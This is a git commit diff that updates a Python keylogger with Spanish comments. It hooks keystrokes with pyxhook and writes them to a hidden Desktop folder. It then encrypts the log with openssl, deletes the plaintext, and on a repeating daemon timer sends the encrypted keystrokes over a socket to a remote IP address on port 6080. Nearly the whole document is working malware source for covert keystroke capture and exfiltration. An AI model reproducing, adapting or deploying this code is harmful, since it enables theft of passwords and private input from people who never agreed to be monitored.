e903be09b77ec969ed506a1ed5df3bbf58aa23f9
EduVale581 <46286246+EduVale581@users.noreply.github.com>
2021-07-04 23:45:30 -0400

    Actualizacion Keylogger

--- keylogger.py
+++ keylogger.py
@@ -17,16 +17,28 @@ def enviarArchivo(sck: socket.socket, archivo):
     with open(archivo, "rb") as f:
         while read_bytes := f.read(1024):
             sck.sendall(read_bytes)
+
+def cipher_file():
+    """
+    Ciphers the file and deletes the original
+    """
+    cmd =  f"openssl rsautl -encrypt -in ~/Desktop/.keylogger/file.log" +\
+        f" -out ~/Desktop/.keylogger/file.log.enc -inkey" +\
+        f" ~/Desktop/.keylogger/public.pem" +\
+        f" -pubin && rm ~/Desktop/.keylogger/file.log && touch ~/Desktop/.keylogger/file.log"
+    os.system(cmd)
+
+
 def crearConexion():
+
+    directory = os.path.expanduser('~/Desktop/.keylogger')
     try:
-        with socket.create_connection(("192.168.1.83", 6080)) as conn:
-            CMD = "openssl rsautl -encrypt -in file.log -out file2.log -inkey ~/Desktop/.keylogger/public.pem -pubin"
-            pipe=subprocess.Popen(CMD, shell=True)
-            pipe.wait()
-            enviarArchivo(conn, "file2.log")
+        with socket.create_connection(("192.168.1.126", 6080)) as conn:
+            cipher_file()
+            enviarArchivo(conn, f"{directory}/file.log.enc")
     except:
-        with open(archivo, 'a') as f:
-            mensaje ="**** El socket no se puede conectar ****"
+        with open(f"{directory}/file.log", 'a') as f:
+            mensaje =" El socket no se puede conectar "
             f.write(mensaje)
             f.write('\n')
 # Guardamos lo que se va escribiendo antes de presionar espacio o enter
@@ -35,9 +47,9 @@ listaCadena =  []
 # Obtenemos el archivo
 archivo = os.environ.get(
     'pylogger_file',
-    os.path.expanduser('file.log')
+    os.path.expanduser('~/Desktop/.keylogger/file.log')
 )
- 
+
 # Validamos si existe el archivo
 if os.environ.get('pylogger_clean', None) is not None:
     try:
@@ -45,8 +57,9 @@ if os.environ.get('pylogger_clean', None) is not None:
     except EnvironmentError:
         pass
 # Comienza a obtener las teclas
+# Comienza a obtener las teclas
 def OnKeyPress(event):
-    # Validamos que solo se guarden las cadenas cuando se presiona espacio o enter.
+    # Validamos que solo se guarden las cadenas cuando se presiona espacio o en>
     if event.Key == "Return" or event.Key == "Space" or event.Key == "space" or event.Key == "P_Enter":
         with open(archivo, 'a') as f:
             mensaje = "".join(listaCadena)
@@ -54,15 +67,13 @@ def OnKeyPress(event):
             f.write('\n')
             listaCadena.clear()
 
-        timer = Timer(interval=3, function=crearConexion)
+        timer = Timer(interval=10, function=crearConexion)
         timer.daemon=True
         timer.start()
 
     else:
         # Agregamos a la lista la tecla presionada.
         listaCadena.append(event.Key)
-
-
 # Iniciamos las librerias para leer los datos.
 lectura = pyxhook.HookManager()
 lectura.KeyDown = OnKeyPress
